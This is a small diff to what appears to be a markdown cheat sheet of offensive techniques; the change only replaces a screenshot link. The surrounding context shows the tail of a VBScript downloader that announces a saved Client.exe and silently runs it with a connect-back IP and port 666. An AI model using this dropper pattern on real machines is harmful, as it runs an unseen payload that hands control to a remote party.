@@ -2168,7 +2168,7 @@ Set objXMLHTTP = Nothing
 x=MsgBox("File Successfully Downloaded" & vbCrLf & "Storage: C:\Users\pedro\Desktop\Client.exe",64,"VBS Downloader")
 CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.168.1.73 port=666"
 ```
-![tr](https://user-images.githubusercontent.com/23490060/94852380-b7dbcf80-0421-11eb-8577-1ebb2ca909ad.png)
+![tr](https://user-images.githubusercontent.com/23490060/94852614-1143fe80-0422-11eb-8729-5891e729064f.png)
 
 ---
 
